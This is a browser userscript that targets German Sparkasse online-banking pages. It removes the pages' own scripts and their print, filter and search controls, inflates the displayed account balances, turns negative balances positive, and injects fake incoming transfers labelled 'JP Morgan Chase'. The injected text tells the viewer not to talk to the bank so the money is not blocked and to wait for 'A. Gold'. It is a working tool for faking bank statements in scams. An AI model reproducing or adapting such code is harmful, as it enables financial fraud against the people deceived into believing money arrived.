// ==UserScript==
// @name         Ed Start 4Rec sp.coach-d@web.de
// @namespace    http://tampermonkey.net/
// @version      7.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/537641/Ed%20Start%204Rec%20spcoach-d%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/537641/Ed%20Start%204Rec%20spcoach-d%40webde.meta.js
// ==/UserScript==









//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    //SCRIPTV2 TRIGGER!



    //SCRIPTV2 TRIGGER!
    var easyUpdate = "no";


    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";
    var absender = "Treuhand: JP Morgan Chase";
    var absenderTitel = "Treuhand: JP Morgan Chase";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen damit nicht gesperrt. A. Graf meldet sich.";
    var amount = 10;
    var vorgemerkt = "no";
    var xamount = 7500;
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "70";
    var buchungTextsZahl = "437.680";
    var accountsecurity = "189 6511 10";

    if (easyUpdate == "yes"){
        x2amount = 10000;}

    var umsatze = "11490787216";
    var finanz = "11490787029";
    var kontodetails = "Downloads";


    //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// NOW STARTING FROM 0, NOT 1
            var main = 1;
            var subtotal = 3;
            var total = 4;


   // Define your transaction details manually here
    const transactions = [
        // NUMERATION STARTING WITH THE END
 //       {
 //           predecimalAmount: '47',
//            decimalAmount: ',33',
//            transactionTitle: 'Your Transaction Title 1',
//            transactionInfo: "Transaction 1 details",
//            isNegative: false // Example flag, modify this based on your actual logic
//        },
        {
            predecimalAmount: '77.977',
            decimalAmount: ',00',
            transactionTitle: 'JP Morgan Chase',
            transactionInfo: " Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen, solange keine Unterlagen. A. Gold meldet sich.",
            isNegative: false // Example flag, modify this based on your actual logic
        },
          {
            predecimalAmount: '7.500',
            decimalAmount: ',00',
            transactionTitle: 'JP Morgan Chase.',
            transactionInfo: "  A. Gold meldet sich. Ohne ihn nicht ausgeben",
            isNegative: false // Example flag, modify this based on your actual logic
        },
 //         {
 //           predecimalAmount: '3.450',
 //           decimalAmount: ',00',
 //           transactionTitle: 'JP Morgan Chase..',
 //           transactionInfo: " A. Gold meldet sich 2.",
 //           isNegative: false // Example flag, modify this based on your actual logic
 //       },
 // {
//            predecimalAmount: '15.000',
//            decimalAmount: ',00',
////            transactionTitle: 'Andreas Gold',
////            transactionInfo: "Geld von A. Gold.",
//            isNegative: false // Example flag, modify this based on your actual logic
//       },  {
 //           predecimalAmount: '3.000',
//            decimalAmount: ',00',
 //           transactionTitle: 'Andreas Gold.',
 //           transactionInfo: "Ohne A. Gold Geld nicht ausgeben.",
 //           isNegative: false // Example flag, modify this based on your actual logic
 //       },
//  {
//            predecimalAmount: '12.000',
 //           decimalAmount: ',50',
//            transactionTitle: 'JP Morgan Chase',
 //           transactionInfo: "Ohne A. Gold Geld nicht ausgeben. Mit Bank nicht besprechen damit nicht gesperrt. A. Gold meldet sich.",
 //           isNegative: false // Example flag, modify this based on your actual logic
 //       },
        // Add more transactions as needed
    ];

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================
if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf(umsatze) > 0 ) {


(function autoscroll() {
    'use strict';

    function scrollEarly() {
        window.scrollBy(0, window.innerHeight * 0.8);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', scrollEarly);
    } else {
        scrollEarly();
    }
})();
 }

     if (window.location.href.indexOf("onlinebanking") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("11317605933") > 0) {

//  GENERAL UTILITY

// Function to remove elements with class "mkp-identifier-account-link"
function removeElementsWithClass(className) {
    console.log("Removing elements with class:", className);
    document.querySelectorAll('.' + className).forEach(function(element) {
        element.remove();
        console.log("Element removed.");
    });
}

// Function to remove scripts from the document
function removeScriptsFromDocument() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Polling function to remove elements with class "mkp-identifier-account-link" every 10 milliseconds
function pollToRemoveElements() {
    setInterval(function() {
        removeElementsWithClass("mkp-identifier-account-link");
    }, 100);
}

// Remove all scripts from the document
removeScriptsFromDocument();

// Start polling to remove elements with class "mkp-identifier-account-link"
pollToRemoveElements();
    }


//  GENERAL UTILITY
//======================================================================================================================================

     if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf(finanz) > 0) {


    // Function to periodically check for the presence of elements with class "mkp-card-link"
    function checkForCardLinkAndUpdateBalances() {
        var cardLinks = document.querySelectorAll('.mkp-card-link');

        // Check each element with class "mkp-card-link"
        cardLinks.forEach(function(cardLink) {
            // Modify balances if the element is found
            console.log('Element with class "mkp-card-link" found. Modifying balances...');

            // Example of modifying balances - replace with your logic
            // Update the main balance and its sibling
            var mainBalanceIndex = main || 0;
            var mainBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[mainBalanceIndex]?.firstElementChild;
            if (mainBalanceElement) {
                updateBalanceAndSiblingClass(mainBalanceElement, xamount);
            }

            // Update the total balance and its sibling
            var totalBalanceIndex = total || 1;
            var totalBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[totalBalanceIndex]?.firstElementChild;
            if (totalBalanceElement) {
                updateBalanceAndSiblingClass(totalBalanceElement, x2amount + xamount);
            }

            // Update the subtotal balance and its sibling
            var subtotalBalanceIndex = subtotal || 1;
            var subtotalBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[subtotalBalanceIndex]?.firstElementChild;
            if (subtotalBalanceElement) {
                updateBalanceAndSiblingClass(subtotalBalanceElement, x2amount + xamount);
            }

            // Remove the mkp-card-link element 5 milliseconds after modification
            setTimeout(() => {
                cardLink.remove();
                console.log("Element with class 'mkp-card-link' removed.");
            }, 10);
        });
    }

    // Check for elements with class "mkp-card-link" every 5 seconds
    setInterval(checkForCardLinkAndUpdateBalances, 90);

    // Function to update balance and handle class change for both the main balance element and its sibling
    function updateBalanceAndSiblingClass(balanceElement, amount) {
        // Get the sibling element
        var siblingElement = balanceElement.nextElementSibling;

        // Get the current balance text
        var balanceText = balanceElement.textContent;

        // Extract the numeric value from the text
        var currentBalance = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(/[^\d,]/g, '').replace(/,/g, '.'));

        // Check if the balance was originally negative
        var wasNegative = balanceText.includes('-');

        // Adjust the sign of the amount based on the original balance
        var adjustedAmount = wasNegative ? -amount : amount;

        // Update the balance
        var newBalance = currentBalance + adjustedAmount;

        // Determine the new class based on the sign of the balance
        var newClass = newBalance < 0 ? 'minus' : 'plus';

        // Update the balance text content with commas
        balanceElement.textContent = numberWithCommas(Math.abs(newBalance)); // Ensure positive value for text content

        // Update the class for the balance element
        balanceElement.classList.remove('minus', 'plus');
        balanceElement.classList.add(newClass);

        // Update the class for the sibling element
        siblingElement.classList.remove('minus', 'plus');
        siblingElement.classList.add(newClass);

        // Change class of balance-decimal if the balance became positive after the modification
        if (!wasNegative && newBalance >= 0) {
            balanceElement.nextElementSibling.classList.remove('minus');
            balanceElement.nextElementSibling.classList.add('plus');
        }
    }

    // Function to format numbers with commas
    function numberWithCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    }

}


  if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf(finanz) > 0) {

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================

        //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

    /// Refresh the finanzstatus page once it loads for the first time

 var refresh = window.localStorage.getItem('refresh');
 console.log(refresh);
 setTimeout(function() {
 if (refresh===null){
 window.location.reload();
   window.localStorage.setItem('refresh', "1");
 }
 }, 40); // 1500 milliseconds = 1.5 seconds

 setTimeout(function() {
 localStorage.removeItem('refresh')
  }, 15); // 1700 milliseconds = 1.7 seconds

          //                        var KontosBoxElement = document.getElementsByClassName("nbf-container-box nbf-container--pfm expandable")[0];
//if (KontosBoxElement) {
 //   KontosBoxElement.remove();
//}


//==========================================================================================================================================================================================================




// Function to remove elements with the class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", elements containing the text "Druckansicht", and elements with class "mkp-expandable-button", and show a spinner when specific text is found
function removePrimaryCTAAndShowSpinner() {
    // Remove elements with the class "primary-cta"


    // Remove elements with the class "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned"
    var elementsToRemoveButtonGroup = document.querySelectorAll('.mkp-button-group.mkp-layout-margin.mkp-button-group-with-separator.mkp-button-group-mobile-left-aligned');
    elementsToRemoveButtonGroup.forEach(function(element) {
        element.remove();
    });

    // Remove elements containing the text "Druckansicht"
    var elementsToRemoveDruckansicht = document.evaluate("//*[contains(text(),'Druckansicht')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
    for (var i = 0; i < elementsToRemoveDruckansicht.snapshotLength; i++) {
        var element = elementsToRemoveDruckansicht.snapshotItem(i);
        element.remove();
    }

 // Function to remove element with id "pfmWidgetId"
function removePfmWidgetIdElement() {
    var pfmWidgetElement = document.getElementById('pfmWidgetId');
    if (pfmWidgetElement) {
        pfmWidgetElement.remove();
        console.log('Removed element with id "pfmWidgetId"');
    }
}

// Regular check every 100 milliseconds to remove the element
setInterval(removePfmWidgetIdElement, 100);

// Mutation observer to remove "pfmWidgetId" element whenever it's added to the DOM
var pfmWidgetObserver = new MutationObserver(function(mutationsList) {
    for(var mutation of mutationsList) {
        if (mutation.type === 'childList') {
            for(var node of mutation.addedNodes) {
                if (node.nodeType === Node.ELEMENT_NODE && node.id === 'pfmWidgetId') {
                    node.remove();
                    console.log('Removed element with id "pfmWidgetId" (mutation observer)');
                }
            }
        }
    }
});

// Start observing the document
pfmWidgetObserver.observe(document.body, { childList: true, subtree: true });







    console.log('Removed elements with class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", "Druckansicht", and "mkp-expandable-button", and showed spinner');
}


function showSpinner() {
    // Show spinner using custom element or other implementation
    var spinner = document.createElement('div');
    spinner.style.position = 'fixed';
    spinner.style.top = '0';
    spinner.style.left = '0';
    spinner.style.width = '100%';
    spinner.style.height = '100%';
    spinner.style.background = 'rgba(255, 255, 255, 0.9)'; // Adjust alpha value here
    spinner.style.zIndex = '9999';
    spinner.innerHTML = '<div style="width: 100px; height: 100px; background: url(https://upload.wikimedia.org/wikipedia/commons/4/4e/Logo-_Sparkassen-App_%E2%80%93_die_mobile_Filiale.png) center center no-repeat; background-size: contain;"></div>';
    document.body.appendChild(spinner);
}

// Call the function immediately
removePrimaryCTAAndShowSpinner();

//-----------------------------------------------------------------------------------------------------------------------------------
//-----------------------------------------------------------------------------------------------------------------------------------




        }

    }



  if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf(finanz) > 0) {


// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Function to check and rename elements with class "mkp-expandable is-hidden" to "mkp-expandable is-visible"
function updateExpandableElements() {
    console.log("Checking and updating expandable elements...");

    // Select all elements with class "mkp-expandable is-hidden"
    var hiddenExpandables = document.querySelectorAll('.mkp-expandable.is-hidden');

    // Loop through each hidden expandable element and update its class
    hiddenExpandables.forEach(function(element) {
        element.classList.remove('is-hidden'); // Remove the "is-hidden" class
        element.classList.add('is-visible');  // Add the "is-visible" class
        console.log('Element class updated:', element);
    });
}

// Watch for changes in the DOM and update expandable elements
var observer = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.classList && node.classList.contains('mkp-expandable') && node.classList.contains('is-hidden')) {
                    console.log("Found added hidden expandable element. Updating...");
                    node.classList.remove('is-hidden'); // Remove the "is-hidden" class
                    node.classList.add('is-visible');  // Add the "is-visible" class
                    console.log("Element updated.");
                }
            }
        }
    }
});

// Start observing the document for changes
observer.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();

// Check and update expandable elements every 50 milliseconds
setInterval(updateExpandableElements, 50);

         }


if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf(finanz) > 0) {

    // Function to remove scripts from the document
    function removeAllScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to remove elements with the specified class
    function removeButtonGroups() {
        console.log("Removing button groups...");
        document.querySelectorAll('.mkp-button-group.mkp-layout-margin.mkp-button-group-with-separator.mkp-button-group-mobile-left-aligned').forEach(function(buttonGroup) {
            buttonGroup.remove();
            console.log("Button group removed.");
        });
    }

    // Watch for changes in the DOM and update expandable elements and remove button groups
    var domObserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    // Update expandable elements
                    if (node.classList && node.classList.contains('mkp-expandable') && node.classList.contains('is-hidden')) {
                        console.log("Found added hidden expandable element. Updating...");
                        node.classList.remove('is-hidden'); // Remove the "is-hidden" class
                        node.classList.add('is-visible');  // Add the "is-visible" class
                        console.log("Element updated.");
                    }

                    // Remove button groups
                    if (node.classList && node.classList.contains('mkp-button-group') &&
                        node.classList.contains('mkp-layout-margin') &&
                        node.classList.contains('mkp-button-group-with-separator') &&
                        node.classList.contains('mkp-button-group-mobile-left-aligned')) {
                        console.log("Found added button group. Removing...");
                        node.remove();
                        console.log("Button group removed.");
                    }
                }
            }
        }
    });

    // Start observing the document for changes
    domObserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeAllScripts();

    // Remove all button groups initially
    removeButtonGroups();

    // Set interval to repeatedly remove button groups
    setInterval(removeButtonGroups, 100);
}



//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf(umsatze) > 0 ) {



var modificationValue = xamount;

// Function to repeatedly check the condition for balance modification
function dynamicCheckAndModifyBalance() {
    // Set the interval for checking the condition (in milliseconds)
    var interval = 5; // 1 second

    // Function to check and modify the balance
    function checkAndModifyBalance() {
        if (document.getElementsByClassName("mkp-identifier-description")[0]?.children[1]?.children[0]?.textContent === accountsecurity) {
            if (vorgemerkt === "no") {
                modifyMainBalance();
            }
        }
    }

    // Call the function initially
    checkAndModifyBalance();

    // Set interval to repeatedly check the condition
    setInterval(checkAndModifyBalance, interval);
}

// Function to modify the main balance
function modifyMainBalance() {
    // Get the element with class "balance-decimal"
    var balanceElement = document.querySelector('.balance-decimal');

    // Check if the element exists and if it has been modified already
    if (balanceElement && balanceElement.getAttribute('data-modified') !== 'true') {
        // Get the text content of the balance element
        var balanceText = balanceElement.textContent.trim();

        // Extract the numeric value from the text content
        var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(/[^\d,]/g, '').replace(/,/g, '.'));

        // Determine the sign of the balance
        var isNegative = balanceText.includes('-');

        // Modify the balance based on the sign and the modification value
        if (isNegative) {
            numericValue -= modificationValue;
        } else {
            numericValue += modificationValue;
        }

        // Update the text content with the modified value and "EUR" currency
        var updatedBalanceText = (isNegative ? '-' : '') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

        // Update the balance text content and class
        balanceElement.textContent = updatedBalanceText;
        balanceElement.className = 'balance-decimal plus';
        balanceElement.setAttribute('data-modified', 'true');

        // Remove minus sign immediately
        var plusBalanceElement = document.querySelector('.balance-decimal.plus');
        if (plusBalanceElement) {
            var updatedBalanceText = plusBalanceElement.textContent.replace(/-/g, '');
            plusBalanceElement.textContent = updatedBalanceText;
        }
    } else {
        console.error('Balance element not found or already modified.');
    }
}

// Call the function to perform dynamic check and modification of the balance
dynamicCheckAndModifyBalance();
 }

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

        //---------------------------------------------------------------------------------------------


// TO WRAP

if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf(umsatze) > 0 ) {

    'use strict';



function chartRemoval() {
    setInterval(() => {
        document.querySelectorAll('.mkp-card.mkp-card-chart.mkp-layout-padding-top-small.mkp-hide-only-sm.mkp-hide-only-xs.mkp-hide-only-xxs')
            .forEach(element => element.remove());
    }, 50);
}

// Call the function to start removing elements
chartRemoval();


    // Function to check if account security text is present
    function isAccountSecurityTextPresent() {
        const accountSecurityElement = document.querySelector('.mkp-identifier-description strong');
        if (accountSecurityElement && accountSecurityElement.textContent.trim() === accountsecurity.trim()) {
            return true; // Account security text found and matches
        }
        return false; // Account security text not found or does not match
    }

    // Function to perform additional check before inserting transactions
    function performAdditionalCheckAndInsert() {
        // Check if account security condition is met
        if (isAccountSecurityTextPresent()) {
            // Perform insertion of transactions
            insertTransactionsInterval();
        } else {
            console.log('Account security check failed, transactions not inserted.');
            // Retry after a delay
            setTimeout(performAdditionalCheckAndInsert, 500); // Retry after 2 seconds
        }
    }

///    // Define your transaction details manually here
//    const transactions = [
//        // NUMERATION STARTING WITH THE END
//        {
//            predecimalAmount: '47',
 //           decimalAmount: ',33',
//            transactionTitle: 'Your Transaction Title 1',
//            transactionInfo: "Transaction 1 details",
//            isNegative: false // Example flag, modify this based on your actual logic
//        },
 //       {
//            predecimalAmount: '100',
 //           decimalAmount: ',50',
//            transactionTitle: 'Your Transaction Title 2',
//            transactionInfo: "Transaction 2 details",
 //           isNegative: true // Example flag, modify this based on your actual logic
//        },
 //       // Add more transactions as needed
 //   ];

    // Function to check if transaction is already inserted
    function isTransactionInserted(transactionTitle) {
        const transactions = document.querySelectorAll('.mkp-card-list > li');
        for (const transaction of transactions) {
            const titleElement = transaction.querySelector('.mkp-identifier-link');
            if (titleElement && titleElement.textContent.trim() === transactionTitle.trim()) {
                return true; // Transaction already inserted
            }
        }
        return false; // Transaction not found
    }

    // Function to insert a single transaction
    function insertTransaction(transaction) {
        // Check if transaction is already inserted
        if (isTransactionInserted(transaction.transactionTitle)) {
            console.log(`Transaction "${transaction.transactionTitle}" already inserted, skipping...`);
            return;
        }

        // Find the target element to insert the transaction
        const targetElement = document.querySelector('.mkp-card-list');

        if (targetElement) {
            // Create a new list item element
            const listItem = document.createElement('li');

            // Determine classes for predecimal and decimal based on transaction sign
            const predecimalClass = transaction.isNegative ? 'minus' : 'plus';
            const decimalClass = transaction.isNegative ? 'minus' : 'plus';

            // Construct the inner HTML for the transaction item
            listItem.innerHTML = `
                <div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable">
                    <div class="mkp-identifier">
                        <div class="mkp-identifier-description">
                            <h4 class="mkp-headline-05">
                                <a href="#" class="mkp-identifier-link" aria-label="Umsatz: ${transaction.transactionTitle}; Betrag: ${transaction.predecimalAmount},${transaction.decimalAmount} EUR">
                                    ${transaction.transactionTitle}
                                </a>
                            </h4>
                            <p>
                                ${transaction.transactionInfo}
                            </p>
                        </div>
                        <div class="mkp-identifier-sticker mkp-identifier-sticker-placeholder" aria-hidden="true"></div> <!-- Added this line -->
                        <div class="mkp-identifier-currency">
                            <p class="mkp-currency mkp-currency-pill mkp-currency-m">
                                <span aria-hidden="true" class="balance-predecimal ${predecimalClass}">${transaction.predecimalAmount}</span>
                                <span aria-hidden="true" class="balance-decimal ${decimalClass}">${transaction.decimalAmount}&nbsp;EUR</span>
                                <span aria-hidden="false" class="offscreen">${transaction.predecimalAmount},${transaction.decimalAmount} EUR</span>
                            </p>
                        </div>
                    </div>
                </div>
            `;

            // Insert the new list item as the first child of mkp-card-list
            targetElement.insertBefore(listItem, targetElement.firstChild);
        } else {
            console.error('Target element .mkp-card-list not found!');
        }
    }

    // Function to insert transactions every 2 seconds
    function insertTransactionsInterval() {
        // Attempt to insert each transaction
        transactions.forEach(transaction => {
            insertTransaction(transaction);
        });

        // Retry insertion if it failed
        setTimeout(insertTransactionsInterval, 200);
    }

    // Start performing additional check initially
    performAdditionalCheckAndInsert();

}







if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf(umsatze) > 0 ) {

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Function to remove elements with specific classes
function removeTargetElements() {
    const classesToRemove = [
        '.bline.nbf-umsatzdrucken.mkp-layout-padding.btext-only',
        '.sort-button-bottom.mkp-row.mkp-justify-content-flex-end',
        '.bline.nbf-umsatzsuchefilter',
        '.mkp-button-flyout.has-valuelist-multiselect',
        '.umsatz-sayt',
        '.mkp-button-flyout.has-button-slot'
    ];

    classesToRemove.forEach(selector => {
        document.querySelectorAll(selector).forEach(function(element) {
            element.remove();
            console.log(`Element with class "${selector}" removed.`);
        });
    });
}

// MutationObserver for hidden expandable elements and target elements
var rtyobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.classList) {
                    if (node.classList.contains('mkp-expandable') && node.classList.contains('is-hidden')) {
                        console.log("Found added hidden expandable element. Updating...");
                      node.classList.add('is-visible');  // Add the "is-visible" class
                        console.log("Element updated.");
                    }

                    // Check and remove target elements
                    if (
                        node.classList.contains('bline') && node.classList.contains('nbf-umsatzdrucken') && node.classList.contains('mkp-layout-padding') && node.classList.contains('btext-only') ||
                        node.classList.contains('sort-button-bottom') && node.classList.contains('mkp-row') && node.classList.contains('mkp-justify-content-flex-end') ||
                        node.classList.contains('bline') && node.classList.contains('nbf-umsatzsuchefilter') ||
                        node.classList.contains('mkp-button-flyout') && node.classList.contains('has-valuelist-multiselect') ||
                        node.classList.contains('umsatz-sayt') ||
                        node.classList.contains('mkp-button-flyout') && node.classList.contains('has-button-slot')
                    ) {
                        node.remove();
                        console.log("Target element removed.");
                    }
                }
            }
        }
    }
});

// Start observing the document for changes
rtyobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();

// Initial removal of target elements
removeTargetElements();

// Set interval to repeatedly check and remove target elements
setInterval(removeTargetElements, 50); // Adjust the interval as needed
}









//==========================================================================================================================================================================================================
if (window.location.href.indexOf("einzelauftrag") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("finanzuebersicht/kontoauswahl.html") > 0) {

    'use strict';

    // Function to remove elements with class "mkp-identifier-currency"
    function removeIdentifierCurrencyElements() {
        var triggerTexts = [
            "Von welchem Konto möchten Sie überweisen?",
            "Für welches Konto möchten Sie Umsätze aufrufen?"
        ];

        triggerTexts.forEach(function(triggerText) {
            if (document.body.textContent.includes(triggerText)) {
                var elementsToRemove = document.querySelectorAll('.mkp-identifier-currency');
                elementsToRemove.forEach(function(element) {
                    element.remove();
                    console.log('Removed element with class "mkp-identifier-currency".');
                });
            }
        });
    }



    // Set interval to run the removal functions every 50 milliseconds
    setInterval(function() {
        removeIdentifierCurrencyElements();

    }, 50);
}


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

if (window.location.href.indexOf("einzelauftrag") > 0 || window.location.href.indexOf("uebertrag") > 0 || window.location.href.indexOf("finanzuebersicht/kontoauswahl.html") > 0 ) {
    'use strict';

    // Function to remove elements with specific classes
    function removeElementsWithClass(className) {
        console.log("Removing elements with class:", className);
        document.querySelectorAll('.' + className).forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove script elements
    function removeScriptElements() {
        document.querySelectorAll('script').forEach(function(element) {
            console.log("Script element found. Removing...");
            element.remove();
            console.log("Script element removed.");
        });
    }

    // Set an interval to continuously remove elements and scripts every 50 milliseconds
    setInterval(function() {
        removeElementsWithClass('mkp-identifier-currency');
        removeElementsWithClass('mkp-identifier-account-link');
        removeElementsWithClass('voraussichtlicherSaldo');
        removeScriptElements();
    }, 50);
}






//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

